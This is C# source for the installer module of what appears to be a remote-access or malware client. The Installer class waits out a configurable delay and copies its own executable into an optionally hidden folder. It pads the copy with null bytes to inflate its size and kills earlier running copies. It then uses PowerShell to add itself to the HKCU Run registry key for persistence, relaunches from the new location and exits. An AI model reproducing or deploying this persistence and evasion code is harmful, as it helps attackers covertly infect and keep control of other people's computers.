using Client.Helper;
using Client.Settings;
using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace Client.Installation
{
    public class Installer
    {
        public bool EnableInstall { get; set; }
        public string FileName { get; set; }
        public DirectoryInfo DirectoryName { get; set; }
        public bool DirectoryHidden { get; set; }
        public string RegistryName { get; set; }
        public int IncreaseSize { get; set; }
        public int Sleeping { get; set; }

        /// <summary>
        /// run installation method
        /// </summary>
        public void Run()
        {
            if (EnableInstall && !IsInstalled())
            {
                for (int i = 0; i < Sleeping; i++)
                {
                    Thread.Sleep(1000);
                }
                CreateDirectory();
                InstallFile();
                InstallRegistry();
                ExecuteFile();
            }
            else
            {
                Config.LoaderPath = Application.ExecutablePath;
            }
        }

        /// <summary>
        /// returns true if the client is already installed
        /// </summary>
        public bool IsInstalled()
        {
            if (Application.ExecutablePath == Path.Combine(DirectoryName.FullName, FileName))
                return true;
            else
                return false;
        }

        /// <summary>
        /// if the folder does not exist, create a new one without or without hidden it
        /// </summary>
        public void CreateDirectory()
        {
            if (!DirectoryName.Exists)
                DirectoryName.Create();
            if (DirectoryHidden)
            {
                DirectoryName.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
            }
        }

        /// <summary>
        /// if the file has a clone then search and kill the process, finally delete the file
        /// then write bytes array with or without increasing itself
        /// </summary>
        public void InstallFile()
        {
            string fullPath = Path.Combine(DirectoryName.FullName, FileName);
            if (File.Exists(fullPath))
            {
                foreach (Process process in Process.GetProcesses())
                {
                    try
                    {
                        if (process.MainModule.FileName == fullPath) process.Kill();
                    }
                    catch { }
                }
                File.Delete(fullPath);
                Thread.Sleep(250);
            }
            using (FileStream fs = new FileStream(fullPath, FileMode.Create, FileAccess.Write))
            {
                byte[] b = File.ReadAllBytes(Application.ExecutablePath);
                fs.Write(b, 0, b.Length);
                if (IncreaseSize > 0)
                {
                    IncreaseSize = IncreaseSize * 1024 * 1000;
                    fs.Write(new byte[IncreaseSize], 0, IncreaseSize);
                }
            }
            Config.LoaderPath = fullPath;
        }

        /// <summary>
        /// delete old registry name, then add the new one
        /// </summary>
        public void InstallRegistry()
        {
            new Powershell().Run($"Remove-ItemProperty -Path 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '{RegistryName}'; " +
                $"New-ItemProperty -Path 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '{RegistryName}' -Value '{Path.Combine(DirectoryName.FullName, FileName)}' -PropertyType 'String'");
        }

        /// <summary>
        /// final step, run it and exit
        /// </summary>
        public void ExecuteFile()
        {
            new Powershell().Run($"Start-Sleep -Seconds 1; Start-Process -FilePath '{Path.Combine(DirectoryName.FullName, FileName)}'");
            Environment.Exit(0);
        }

    }
}
